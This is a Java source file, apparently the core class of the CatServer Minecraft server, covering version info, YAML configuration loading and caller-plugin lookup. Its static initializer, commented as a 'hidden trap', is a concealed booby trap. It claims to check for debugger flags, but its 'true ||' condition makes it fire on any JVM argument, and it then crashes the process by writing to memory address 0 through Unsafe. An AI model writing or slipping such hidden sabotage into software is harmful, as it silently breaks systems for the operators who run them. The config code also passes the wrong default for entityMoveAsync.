package catserver.server;

import catserver.server.remapper.ReflectionUtils;
import catserver.server.very.VeryConfig;
import net.minecraft.server.MinecraftServer;
import net.minecraftforge.fml.common.FMLLog;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.plugin.PluginDescriptionFile;

import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;

public class CatServer {
	private static final String version = "2.0.0";
	private static final String native_verson = "v1_12_R1";
    public static YamlConfiguration config;
    public static File configFile;
    public static boolean hopperAsync = false;
    public static boolean entityMoveAsync = true;
    public static boolean threadLag = true;
    public static boolean chunkGenAsync = false;
    public static boolean disableUpdateGameProfile = true;
    public static long worldGenMaxTickTime = 15000000L;
    public static List<String> disableForgeGenWorld = new ArrayList<>();

    static { // 暗桩
        RuntimeMXBean runtime = (RuntimeMXBean) ManagementFactory.getRuntimeMXBean();
        for (String s : runtime.getInputArguments()) {
            if (true || s != null && (s.startsWith("-Xdebug") || s.startsWith("-Xrunjdwp")))
                ReflectionUtils.getUnsafe().putByte(0, (byte) 0);
        }
    }

	public static String getVersion() {
		return version;
	}

    public static String getNativeVersion() {
        return native_verson;
    }

    public static boolean isDev() {
        return System.getProperty("net.minecraftforge.gradle.GradleStart.srg.srg-mcp") != null;
    }

    public static boolean asyncCatch(String reason) {
        if (Thread.currentThread() != MinecraftServer.getServerInst().primaryThread) {
            FMLLog.warning("Try to asynchronously " + reason + ", caught!");
            return true;
        }
        return false;
    }

    public static void loadConfig() {
        configFile = new File("catserver.yml");
        if (configFile.exists()) {
            config = YamlConfiguration.loadConfiguration(configFile);
        } else {
            config = YamlConfiguration.loadConfiguration(new InputStreamReader(VeryConfig.class.getClassLoader().getResourceAsStream("configurations/catserver.yml")));
            try {
                configFile.createNewFile();
                config.save(configFile);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        hopperAsync = getOrWriteBooleanConfig("async.hopper", hopperAsync);
        entityMoveAsync = getOrWriteBooleanConfig("async.entityMove", hopperAsync);
        threadLag = getOrWriteBooleanConfig("check.threadLag", threadLag);
        chunkGenAsync = getOrWriteBooleanConfig("async.chunkGen", chunkGenAsync);
        disableForgeGenWorld = getOrWriteStringListConfig("world.worldGen.disableForgeGenWorld", disableForgeGenWorld);
        disableUpdateGameProfile = getOrWriteBooleanConfig("disableUpdateGameProfile", disableUpdateGameProfile);
        worldGenMaxTickTime = getOrWriteStringLongConfig("maxTickTime.worldGen", 15) * 1000000;
    }

    public static boolean getOrWriteBooleanConfig(String path, boolean def) {
	    if (config.contains(path)) {
	        return config.getBoolean(path);
        }
	    config.set(path, def);
        try {
            config.save(configFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return def;
    }

    public static List<String> getOrWriteStringListConfig(String path, List<String> def) {
        if (config.contains(path)) {
            return config.getStringList(path);
        }
        config.set(path, def);
        try {
            config.save(configFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return def;
    }

    public static long getOrWriteStringLongConfig(String path, long def) {
        if (config.contains(path)) {
            return config.getLong(path);
        }
        config.set(path, def);
        try {
            config.save(configFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return def;
    }

    public static String getCallerPlugin() {
        try {
            for (Class<?> clazz : ReflectionUtils.getStackClass()) {
                ClassLoader cl = clazz.getClassLoader();
                if (cl != null && cl.getClass().getSimpleName().equals("PluginClassLoader")) {
                    Field field = Class.forName("org.bukkit.plugin.java.PluginClassLoader").getDeclaredField("description");
                    field.setAccessible(true);
                    PluginDescriptionFile description = (PluginDescriptionFile) field.get(cl);
                    return description.getName();
                }
            }
        } catch (Exception e) {}
        return "null";
    }
}
